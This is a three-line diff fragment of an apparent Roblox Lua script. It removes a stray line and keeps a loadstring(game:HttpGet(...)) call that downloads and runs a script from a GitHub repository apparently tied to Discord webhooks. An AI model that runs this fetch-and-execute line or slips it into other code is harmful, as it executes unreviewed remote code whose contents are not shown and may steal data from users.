@@ -1,4 +1,3 @@
-ss
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
 
 -- Define the allowed PlaceGameID
